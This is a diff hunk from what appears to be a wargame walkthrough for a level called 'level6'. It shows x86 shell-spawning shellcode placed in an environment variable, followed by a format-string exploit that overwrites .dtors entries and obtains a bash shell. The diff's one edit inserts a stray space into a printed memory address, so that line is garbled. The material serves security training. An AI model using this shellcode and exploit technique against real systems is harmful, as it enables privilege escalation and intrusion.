@@ -126,7 +126,7 @@ Contents of section .dtors:
 [level6@logic level6]$ export PAYLOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
 [level6@logic level6]$ cd /tmp/level6
 [level6@logic level6]$ ./getenv PAYLOAD
-PAYLOAD is at 0xbfffdfb0
+PAYLOAD is at 0xbfff dfb0
 [level6@logic level6]$ cd /levels/level6
 [level6@logic level6]$ ./level6 $(python -c "print '\x86\x95\x04\x08\x84\x95\x04\x08'+'%.49143x%10\$hn%.8113x%11\$hn'")
 bash-3.2$ whoami
